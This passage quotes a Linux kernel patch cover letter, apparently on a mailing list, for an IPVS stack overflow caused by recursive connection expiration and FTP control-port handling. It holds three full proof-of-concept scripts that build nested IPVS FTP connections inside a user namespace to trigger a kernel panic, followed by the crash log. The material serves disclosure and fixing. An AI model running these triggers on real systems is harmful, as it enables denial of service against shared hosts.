+>             conn, addr = srv.accept()
+>             conn.sendall(b"220 ready\r\n")
+>             line = recv_line(conn)
+>             if b"EPSV" not in line.upper():
+>                 raise RuntimeError(f"unexpected request on level {i}: {line!r}")
+>             conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
+>             accepted.append(conn)
+>         while True:
+>             time.sleep(1)
+>     except BaseException as exc:
+>         server_error.append(repr(exc))
+>         ready.set()
+> 
+> 
+> try:
+>     try:
+>         ipvs_flush()
+>     except OSError:
+>         pass
+>     service = ipvs_add_service()
+>     ipvs_add_dest(service)
+> except OSError as exc:
+>     raise SystemExit(f"ipvs setup failed: {exc}")
+> 
+> 
+> threading.Thread(target=server, daemon=True).start()
+> ready.wait()
+> if server_error:
+>     raise SystemExit(f"server failed early: {server_error[0]}")
+> 
+> for i in range(depth):
+>     try:
+>         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>         s.bind((client_ip, 0))
+>         s.connect((vip, port))
+>         banner = recv_line(s)
+>         if not banner.startswith(b"220 "):
+>             raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
+>         s.sendall(b"EPSV\r\n")
+>         reply = recv_line(s)
+>         if b"229 " not in reply:
+>             raise RuntimeError(f"unexpected EPSV reply on level {i}: {reply!r}")
+>         clients.append(s)
+>         if (i + 1) % 50 == 0 or i + 1 == depth:
+>             print(f"built {i + 1} connections", flush=True)
+>     except BaseException as exc:
+>         client_error.append(repr(exc))
+>         break
+> 
+> if client_error:
+>     raise SystemExit(f"client failed: {client_error[0]}")
+> if server_error:
+>     raise SystemExit(f"server failed: {server_error[0]}")
+> 
+> try:
+>     with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
+>         conn_lines = sum(1 for _ in f) - 1
+> except OSError:
+>     conn_lines = -1
+> 
+> print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
+> 
+> if mode == "hold":
+>     while True:
+>         time.sleep(1)
+> elif mode == "flush":
+>     ipvs_flush()
+>     print("IPVS flush returned", flush=True)
+>     while True:
+>         time.sleep(1)
+> elif mode == "exit":
+>     print("exiting namespace holder", flush=True)
+>     sys.stdout.flush()
+>     os._exit(0)
+> else:
+>     raise SystemExit(f"unknown MODE={mode!r}")
+> PY
+> ------END poc-original.sh--------
+> 
+> ------BEGIN poc.sh------
+> #!/bin/sh
+> set -eu
+> 
+> DEPTH="${1:-400}"
+> MODE="${MODE:-exit}"
+> SELF_UNSHARE="${SELF_UNSHARE:-0}"
+> 
+> if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
+> 	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
+> 		unshare -Urn -- "$0" "${DEPTH}"
+> fi
+> 
+> ulimit -n 65535 2>/dev/null || true
+> 
+> IP=/usr/sbin/ip
+> PYTHON=/usr/bin/python3
+> 
+> VIP=198.51.100.1
+> REAL=198.51.100.2
+> CLIENT=198.51.100.3
+> PORT=21
+> 
+> "${IP}" link set lo up
+> "${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
+> "${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
+> "${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true
+> 
+> exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
+> import ctypes
+> import os
+> import socket
+> import sys
+> import threading
+> import time
+> 
+> depth = int(sys.argv[1])
+> mode = sys.argv[2]
+> vip = sys.argv[3]
+> real = sys.argv[4]
+> client_ip = sys.argv[5]
+> port = int(sys.argv[6])
+> 
+> ready = threading.Event()
+> server_error = []
+> client_error = []
+> accepted = []
+> clients = []
+> rejected = 0
+> 
+> IP_VS_BASE_CTL = 64 + 1024 + 64
+> IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
+> IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
+> IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7
+> 
+> 
+> class Svc(ctypes.Structure):
+>     _fields_ = [
+>         ("protocol", ctypes.c_uint16),
+>         ("addr", ctypes.c_uint32),
+>         ("port", ctypes.c_uint16),
+>         ("fwmark", ctypes.c_uint32),
+>         ("sched_name", ctypes.c_char * 16),
+>         ("flags", ctypes.c_uint),
+>         ("timeout", ctypes.c_uint),
+>         ("netmask", ctypes.c_uint32),
+>     ]
+> 
+> 
+> class Dest(ctypes.Structure):
+>     _fields_ = [
+>         ("addr", ctypes.c_uint32),
+>         ("port", ctypes.c_uint16),
+>         ("conn_flags", ctypes.c_uint),
+>         ("weight", ctypes.c_int),
+>         ("u_threshold", ctypes.c_uint32),
+>         ("l_threshold", ctypes.c_uint32),
+>     ]
+> 
+> 
+> def native_u32(ip):
+>     return int.from_bytes(socket.inet_aton(ip), sys.byteorder)
+> 
+> 
+> def ipvs_sock():
+>     return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+> 
+> 
+> def ipvs_flush():
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
+>     finally:
+>         s.close()
+> 
+> 
+> def ipvs_add_service():
+>     svc = Svc()
+>     svc.protocol = socket.IPPROTO_TCP
+>     svc.addr = native_u32(vip)
+>     svc.port = socket.htons(port)
+>     svc.fwmark = 0
+>     svc.sched_name = b"rr"
+>     svc.flags = 0
+>     svc.timeout = 0
+>     svc.netmask = 0
+> 
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
+>     finally:
+>         s.close()
+>     return svc
+> 
+> 
+> def ipvs_add_dest(svc):
+>     dest = Dest()
+>     dest.addr = native_u32(real)
+>     dest.port = socket.htons(port)
+>     dest.conn_flags = 0
+>     dest.weight = 1
+>     dest.u_threshold = 0
+>     dest.l_threshold = 0
+> 
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
+>     finally:
+>         s.close()
+> 
+> 
+> def recv_line(sock):
+>     data = bytearray()
+>     while not data.endswith(b"\n"):
+>         chunk = sock.recv(1)
+>         if not chunk:
+>             raise RuntimeError("unexpected EOF")
+>         data.extend(chunk)
+>     return bytes(data)
+> 
+> 
+> def server():
+>     try:
+>         srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>         srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+>         srv.bind((real, port))
+>         srv.listen(depth + 16)
+>         ready.set()
+>         for i in range(depth):
+>             conn, addr = srv.accept()
+>             conn.sendall(b"220 ready\r\n")
+>             line = recv_line(conn)
+>             if b"EPSV" not in line.upper():
+>                 raise RuntimeError(f"unexpected request on level {i}: {line!r}")
+>             conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
+>             accepted.append(conn)
+>         while True:
+>             time.sleep(1)
+>     except BaseException as exc:
+>         server_error.append(repr(exc))
+>         ready.set()
+> 
+> 
+> try:
+>     try:
+>         ipvs_flush()
+>     except OSError:
+>         pass
+>     service = ipvs_add_service()
+>     ipvs_add_dest(service)
+> except OSError as exc:
+>     raise SystemExit(f"ipvs setup failed: {exc}")
+> 
+> 
+> threading.Thread(target=server, daemon=True).start()
+> ready.wait()
+> if server_error:
+>     raise SystemExit(f"server failed early: {server_error[0]}")
+> 
+> for i in range(depth):
+>     try:
+>         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>         s.bind((client_ip, 0))
+>         s.connect((vip, port))
+>         banner = recv_line(s)
+>         if not banner.startswith(b"220 "):
+>             raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
+>         s.sendall(b"EPSV\r\n")
+>         s.settimeout(0.2)
+>         try:
+>             reply = recv_line(s)
+>         except socket.timeout:
+>             rejected += 1
+>             print(f"control-port reply rejected on level {i}", flush=True)
+>         else:
+>             raise RuntimeError(
+>                 f"control-port reply was not rejected on level {i}: {reply!r}"
+>             )
+>         clients.append(s)
+>         if (i + 1) % 50 == 0 or i + 1 == depth:
+>             print(f"built {i + 1} connections", flush=True)
+>     except BaseException as exc:
+>         client_error.append(repr(exc))
+>         break
+> 
+> if client_error:
+>     raise SystemExit(f"client failed: {client_error[0]}")
+> if server_error:
+>     raise SystemExit(f"server failed: {server_error[0]}")
+> if rejected != depth:
+>     raise SystemExit(f"expected {depth} rejected replies, got {rejected}")
+> 
+> try:
+>     with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
+>         conn_lines = sum(1 for _ in f) - 1
+> except OSError:
+>     conn_lines = -1
+> 
+> print(f"rejected control-port replies: {rejected}/{depth}", flush=True)
+> print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
+> if conn_lines != depth:
+>     raise SystemExit(
+>         f"expected {depth} IPVS entries, got {conn_lines}; "
+>         "a passive data connection was created"
+>     )
+> print(f"passive data connections created: {conn_lines - depth}", flush=True)
+> 
+> if mode == "hold":
+>     while True:
+>         time.sleep(1)
+> elif mode == "flush":
+>     ipvs_flush()
+>     print("IPVS flush returned", flush=True)
+>     while True:
+>         time.sleep(1)
+> elif mode == "exit":
+>     print("exiting namespace holder", flush=True)
+>     sys.stdout.flush()
+>     os._exit(0)
+> else:
+>     raise SystemExit(f"unknown MODE={mode!r}")
+> PY
+> ------END poc.sh--------
+> 
+> ------BEGIN poc-active.sh------
+> #!/bin/sh
+> set -eu
+> 
+> DEPTH="${1:-400}"
+> MODE="${MODE:-exit}"
+> SELF_UNSHARE="${SELF_UNSHARE:-0}"
+> 
+> if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
+> 	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
+> 		unshare -Urn -- "$0" "${DEPTH}"
+> fi
+> 
+> ulimit -n 65535 2>/dev/null || true
+> 
+> IP=/usr/sbin/ip
+> PYTHON=/usr/bin/python3
+> 
+> VIP=198.51.100.1
+> REAL=198.51.100.2
+> CLIENT=198.51.100.3
+> PORT=21
+> 
+> "${IP}" link set lo up
+> "${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
+> "${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
+> "${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true
+> 
+> exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
+> import ctypes
+> import os
+> import socket
+> import sys
+> import threading
+> import time
+> 
+> depth = int(sys.argv[1])
+> mode = sys.argv[2]
+> vip = sys.argv[3]
+> real = sys.argv[4]
+> client_ip = sys.argv[5]
+> port = int(sys.argv[6])
+> 
+> ready = threading.Event()
+> server_error = []
+> client_error = []
+> accepted = []
+> clients = []
+> 
+> IP_VS_BASE_CTL = 64 + 1024 + 64
+> IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
+> IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
+> IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7
+> 
+> 
+> class Svc(ctypes.Structure):
+>     _fields_ = [
+>         ("protocol", ctypes.c_uint16),
+>         ("addr", ctypes.c_uint32),
+>         ("port", ctypes.c_uint16),
+>         ("fwmark", ctypes.c_uint32),
+>         ("sched_name", ctypes.c_char * 16),
+>         ("flags", ctypes.c_uint),
+>         ("timeout", ctypes.c_uint),
+>         ("netmask", ctypes.c_uint32),
+>     ]
+> 
+> 
+> class Dest(ctypes.Structure):
+>     _fields_ = [
+>         ("addr", ctypes.c_uint32),
+>         ("port", ctypes.c_uint16),
+>         ("conn_flags", ctypes.c_uint),
+>         ("weight", ctypes.c_int),
+>         ("u_threshold", ctypes.c_uint32),
+>         ("l_threshold", ctypes.c_uint32),
+>     ]
+> 
+> 
+> def native_u32(ip):
+>     return int.from_bytes(socket.inet_aton(ip), sys.byteorder)
+> 
+> 
+> def ipvs_sock():
+>     return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+> 
+> 
+> def ipvs_flush():
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
+>     finally:
+>         s.close()
+> 
+> 
+> def ipvs_add_service():
+>     svc = Svc()
+>     svc.protocol = socket.IPPROTO_TCP
+>     svc.addr = native_u32(vip)
+>     svc.port = socket.htons(port)
+>     svc.fwmark = 0
+>     svc.sched_name = b"rr"
+>     svc.flags = 0
+>     svc.timeout = 0
+>     svc.netmask = 0
+> 
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
+>     finally:
+>         s.close()
+>     return svc
+> 
+> 
+> def ipvs_add_dest(svc):
+>     dest = Dest()
+>     dest.addr = native_u32(real)
+>     dest.port = socket.htons(port)
+>     dest.conn_flags = 0
+>     dest.weight = 1
+>     dest.u_threshold = 0
+>     dest.l_threshold = 0
+> 
+>     s = ipvs_sock()
+>     try:
+>         s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
+>     finally:
+>         s.close()
+> 
+> 
+> def recv_line(sock):
+>     data = bytearray()
+>     while not data.endswith(b"\n"):
+>         chunk = sock.recv(1)
+>         if not chunk:
+>             raise RuntimeError("unexpected EOF")
+>         data.extend(chunk)
+>     return bytes(data)
+> 
+> 
+> def server():
+>     try:
+>         srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>         srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+>         srv.bind((real, port))
+>         srv.listen(depth + 16)
+>         ready.set()
+>         for i in range(depth):
+>             conn, addr = srv.accept()
+>             conn.sendall(b"220 ready\r\n")
+>             line = recv_line(conn)
+>             if not line.upper().startswith(b"PORT "):
+>                 raise RuntimeError(f"unexpected request on level {i}: {line!r}")
+>             conn.sendall(b"200 PORT command successful\r\n")
+>             accepted.append(conn)
+>         while True:
+>             time.sleep(1)
+>     except BaseException as exc:
+>         server_error.append(repr(exc))
+>         ready.set()
+> 
+> 
+> try:
+>     try:
+>         ipvs_flush()
+>     except OSError:
+>         pass
+>     service = ipvs_add_service()
+>     ipvs_add_dest(service)
+> except OSError as exc:
+>     raise SystemExit(f"ipvs setup failed: {exc}")
+> 
+> 
+> threading.Thread(target=server, daemon=True).start()
+> ready.wait()
+> if server_error:
+>     raise SystemExit(f"server failed early: {server_error[0]}")
+> 
+> for i in range(depth):
+>     try:
+>         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>         s.bind((client_ip, 0))
+>         s.connect((vip, port))
+>         banner = recv_line(s)
+>         if not banner.startswith(b"220 "):
+>             raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
+>         s.sendall(b"PORT 198,51,100,3,4,1\r\n")
+>         time.sleep(0.2)
+>         clients.append(s)
+>         if (i + 1) % 50 == 0 or i + 1 == depth:
+>             print(f"built {i + 1} connections", flush=True)
+>     except BaseException as exc:
+>         client_error.append(repr(exc))
+>         break
+> 
+> if client_error:
+>     raise SystemExit(f"client failed: {client_error[0]}")
+> if server_error:
+>     raise SystemExit(f"server failed: {server_error[0]}")
+> 
+> try:
+>     with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
+>         conn_lines = sum(1 for _ in f) - 1
+> except OSError:
+>     conn_lines = -1
+> 
+> print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
+> if conn_lines != depth:
+>     raise SystemExit(
+>         f"expected {depth} IPVS entries, got {conn_lines}; "
+>         "a derived data connection was created"
+>     )
+> print(f"derived data connections created: {conn_lines - depth}", flush=True)
+> 
+> if mode == "hold":
+>     while True:
+>         time.sleep(1)
+> elif mode == "flush":
+>     ipvs_flush()
+>     print("IPVS flush returned", flush=True)
+>     while True:
+>         time.sleep(1)
+> elif mode == "exit":
+>     print("exiting namespace holder", flush=True)
+>     sys.stdout.flush()
+>     os._exit(0)
+> else:
+>     raise SystemExit(f"unknown MODE={mode!r}")
+> PY
+> ------END poc-active.sh--------
+> 
+> ----BEGIN crash log----
+> [   40.621758] BUG: KASAN: stack-out-of-bounds in __unwind_start (arch/x86/kernel/unwind_orc.c:715)
+> [   40.621785] Write of size 112 at addr ff11000007307e98 by task kworker/u8:0/12
+> [   40.621785] 
+> [   40.621785] CPU: 1 UID: 0 PID: 12 Comm: kworker/u8:0 Not tainted 7.3.0-rc2-g70194dc37670 #1 PREEMPT(lazy) 
+> [   40.621785] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+> [   40.621785] Workqueue: netns cleanup_net
+> [   40.621785] Call Trace:
+> 
+> [   40.951167] BUG: unable to handle page fault for address: ff11000011430ff4
+> [   40.951167] #PF: supervisor instruction fetch in kernel mode
+> [   40.951167] #PF: error_code(0x0011) - permissions violation
+> [   40.951167] PGD 6f1e067 P4D 6f1f067 PUD 6f20067 PMD 80000000114001e3 
+> [   40.951167] Thread overran stack, or stack corrupted
+> [   40.951167] Oops: Oops: 0011 [#1] SMP KASAN NOPTI
+> [   40.951167] CPU: 0 UID: 0 PID: 11 Comm: kworker/0:1 Tainted: G        W           7.3.0-rc2-g70194dc37670 #1 PREEMPT(lazy) 
+> [   40.951167] Tainted: [W]=WARN
+> [   40.951167] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+> [   40.951167] Workqueue:  0x0 (events_freezable_pwr_efficient)
+> 
+> [   40.951167] Call Trace:
+> [   40.951167]  <TASK>
+> [   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
+> [   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
+> [   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
+> [   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
+> [   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
+> [   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
+> [   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
+> [   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
+> [   40.951167]  </TASK>
+> 
+> [   40.951167] Kernel panic - not syncing: Fatal exception
+> [   40.951167] Shutting down cpus with NMI
+> [   40.951167] Kernel Offset: disabled
+> [   40.951167] ---[ end Kernel panic - not syncing: Fatal exception ]---
+> -----END crash log-----
+> 
+> changes in v6:
+>   - Replace the v5 deletion patch with Julian Anastasov's latest
+>     reference-accounting connection-deletion fix.
+>   - Rebase the iterative controller cleanup on the new deletion helper
+>     and retain the passive and active FTP control-port checks.
+>   - v5 Link: https://lore.kernel.org/all/cover.1790266803.git.zihanx@nebusec.ai/
+> changes in v5:
+>   - Update patch 1 with Julian Anastasov's v3 connection-deletion fix.
+>   - Rebase the iterative cleanup and resend the FTP checks as patch 3/3.
+>   - v4 Link: https://lore.kernel.org/all/cover.1790146910.git.zihanx@nebusec.ai/
+> changes in v4:
+>   - Add the timer-callback deletion fix as patch 1 and rebase the
+>     iterative controller cleanup on it.
+>   - Add the active-mode guard for configured FTP control ports.
+>   - v3 Link: https://lore.kernel.org/all/cover.1789877273.git.zihanx@nebusec.ai/
+> changes in v3:
+>   - Add the active-mode guard for configured FTP control ports.
+>   - Handle the timer-callback race while keeping cleanup iterative.
+>   - v2 Link: https://lore.kernel.org/all/cover.1789435989.git.zihanx@nebusec.ai/
+> changes in v2:
+>   - Replace recursive controller expiration with an iterative path.
+>   - Add the FTP-helper checks for configured control ports.
+>   - v1 Link: https://lore.kernel.org/all/cover.1789110326.git.zihanx@nebusec.ai/
+> 
+> Best regards,
+> Zihan Xi
+> 
+> Julian Anastasov (1):
+>   ipvs: fix problems during connection deletion
+> 
+> Zihan Xi (2):
+>   ipvs: avoid stack overflow from recursive connection expiration
+>   ipvs: reject FTP control ports as data ports
+> 
+>  include/net/ip_vs.h             |   1 -
+>  net/netfilter/ipvs/ip_vs_conn.c | 125 +++++++++++++++++++-------------
+>  net/netfilter/ipvs/ip_vs_ftp.c  |  18 +++++
+>  net/netfilter/ipvs/ip_vs_sync.c |   2 +-
+>  4 files changed, 95 insertions(+), 51 deletions(-)
+> 
+> -- 
+> 2.43.0
+
+Regards
+
+--
+Julian Anastasov <ja@ssi.bg>
 
